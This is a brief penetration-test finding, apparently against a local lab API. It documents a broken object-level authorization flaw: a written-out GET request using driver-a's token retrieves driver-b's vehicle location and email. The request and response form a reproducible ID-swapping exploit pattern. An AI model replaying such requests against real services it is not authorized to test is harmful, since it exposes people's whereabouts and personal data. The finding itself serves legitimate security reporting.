# F-01 — BOLA on vehicle location

**Endpoint:** `GET /identity/api/v2/vehicle/{vehicleId}/location`
**Date:** 2026-11-06

## Request (as driver-a, requesting driver-b's vehicle)

GET /identity/api/v2/vehicle/fea4d175-bae2-4240-976f-37778f9671e5/location
Host: localhost:8888
Authorization: Bearer <driver-a token — redacted>

## Response (200 OK)

{
  "carId": "fea4d175-bae2-4240-976f-37778f9671e5",
  "vehicleLocation": { "latitude": "37.40...", "longitude": "-94.70..." },
  "fullName": "<redacted>",
  "email": "driver-b@example.com"
}

## Result

driver-a retrieved the real-time location AND owner PII of driver-b's vehicle,
using only driver-a's own token. The server validates authentication but not
object ownership.
